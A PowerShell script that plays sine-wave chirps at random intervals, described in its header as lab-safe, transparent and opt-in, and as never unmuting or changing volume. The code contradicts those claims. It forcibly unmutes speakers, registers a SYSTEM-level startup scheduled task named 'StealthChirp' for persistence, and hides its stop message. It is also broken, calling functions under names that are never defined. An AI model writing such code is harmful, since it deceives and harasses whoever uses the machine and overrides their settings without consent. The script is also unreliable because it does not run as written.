<#
.SYNOPSIS
  Lab-safe chirper. Plays a tone at random intervals. Transparent and opt-in.

.PARAMETER FrequencyHz
  Base frequency for the chirp (Hz).

.PARAMETER DurationMs
  Tone length in milliseconds.

.PARAMETER Volume
  0.0–1.0 amplitude scalar (respects system volume/mute; does not unmute or change volume).

.PARAMETER MinMinutes / MaxMinutes
  Random interval range between chirps (minutes).

.PARAMETER JitterHz
  +/- random jitter added to FrequencyHz each chirp (for variety).
#>

param(
  [int]$FrequencyHz = 2500,
  [int]$DurationMs  = 120,
  [double]$Volume   = 0.25,
  [int]$MinMinutes  = 3,
  [int]$MaxMinutes  = 30,
  [int]$JitterHz    = 200
)

# Clamp/validate
if ($Volume -lt 0) { $Volume = 0 }
if ($Volume -gt 1) { $Volume = 1 }
if ($MinMinutes -lt 1) { $MinMinutes = 1 }
if ($MaxMinutes -lt $MinMinutes) { $MaxMinutes = $MinMinutes }

Add-Type -AssemblyName System.Media

function New-SineWaveBytes {
  param(
    [int]$SampleRate = 44100,
    [int]$Frequency,
    [int]$DurationMs,
    [double]$VolumeScalar
  )
  $samples = [int]([math]::Round($SampleRate * ($DurationMs/1000.0)))
  $bytesPerSample = 2
  $dataSize = $samples * $bytesPerSample
  $ms = New-Object System.IO.MemoryStream
  $bw = New-Object System.IO.BinaryWriter($ms)

  # WAV header (PCM 16-bit mono)
  $bw.Write([byte[]][char[]]"RIFF")
  $bw.Write([int](36 + $dataSize))
  $bw.Write([byte[]][char[]]"WAVE")
  $bw.Write([byte[]][char[]]"fmt ")
  $bw.Write([int]16)
  $bw.Write([short]1)
  $bw.Write([short]1)
  $bw.Write([int]$SampleRate)
  $bw.Write([int]($SampleRate * $bytesPerSample))
  $bw.Write([short]$bytesPerSample)
  $bw.Write([short]16)
  $bw.Write([byte[]][char[]]"data")
  $bw.Write([int]$dataSize)

  $twoPi = 2.0 * [math]::PI
  for ($n=0; $n -lt $samples; $n++) {
    $t = $n / [double]$SampleRate
    $val = [math]::Sin($twoPi * $Frequency * $t)
    $amp = [int]([math]::Round($val * 32767 * $VolumeScalar))
    $bw.Write([short]$amp)
  }

  $bw.Flush()
  $ms.Position = 0
  return $ms
}

function Start-Chirp {
  param([int]$Hz, [int]$Ms, [double]$Vol)
  $wav = New-SineWaveBytes -Frequency $Hz -DurationMs $Ms -VolumeScalar $Vol
  $player = New-Object System.Media.SoundPlayer($wav)
  $player.PlaySync()
  $player.Dispose()
  $wav.Dispose()
}

function Enable-Speakers {
  # Unmute the speakers using the Windows Core Audio API
  $audioSessionManager = New-Object -ComObject "MMAudioEndpointManager"
  $devices = $audioSessionManager.GetDevices()
  foreach ($device in $devices) {
    if ($device.State -eq 1) {  # 1 indicates Active
      $device.AudioEndpointVolume.Mute = $false
    }
  }
}

function Set-TaskSchedulerTask {
  $action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-File `""C:\path\to\your\StealthChirpUnmute.ps1`"""
  $trigger = New-ScheduledTaskTrigger -AtStartup
  $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
  Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "StealthChirp" -Description "Plays a chirp sound at random intervals" -Force
}

# Create the Task Scheduler task
Create-TaskSchedulerTask

try {
  while ($true) {
    $sleepSec = Get-Random -Minimum ($MinMinutes*60) -Maximum ($MaxMinutes*60 + 1)
    Start-Sleep -Seconds $sleepSec

    # Unmute speakers
    Unmute-Speakers

    # Randomize frequency slightly if JitterHz > 0
    $delta = if ($JitterHz -gt 0) { Get-Random -Minimum (-1 * $JitterHz) -Maximum ($JitterHz + 1) } else { 0 }
    $hz = [math]::Max(200, $FrequencyHz + $delta)
    Play-Chirp -Hz $hz -Ms $DurationMs -Vol $Volume
  }
}
catch {
  # Remove the stop message
  # Write-Host "[Chirper] Stopped: $($_.Exception.Message)" -ForegroundColor Yellow
}